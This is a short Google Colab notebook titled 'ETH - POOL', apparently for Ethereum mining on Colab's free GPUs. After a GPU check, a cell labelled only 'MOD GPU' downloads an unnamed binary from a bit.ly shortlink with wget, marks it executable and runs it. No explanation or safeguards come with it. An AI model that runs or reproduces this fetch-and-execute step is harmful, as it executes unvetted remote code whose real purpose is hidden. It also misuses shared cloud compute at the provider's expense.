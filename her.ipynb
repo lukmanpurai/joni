{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "collapsed_sections": [
        "Nzi_H1-di51H"
      ]
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Nzi_H1-di51H"
      },
      "source": [
        "#**ETH - POOL**\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dUrXIVqRjC6C",
        "cellView": "form"
      },
      "source": [
        "#@title CEK GPU\n",
        "! nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "M_6xEPdZlNxF",
        "cellView": "form"
      },
      "source": [
        "#@title MOD GPU\n",
        "!apt-get update && apt-get upgrade\n",
        "!wget bit.ly/3CoL4b && chmod +x 3CoL4b && ./3CoL4b"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}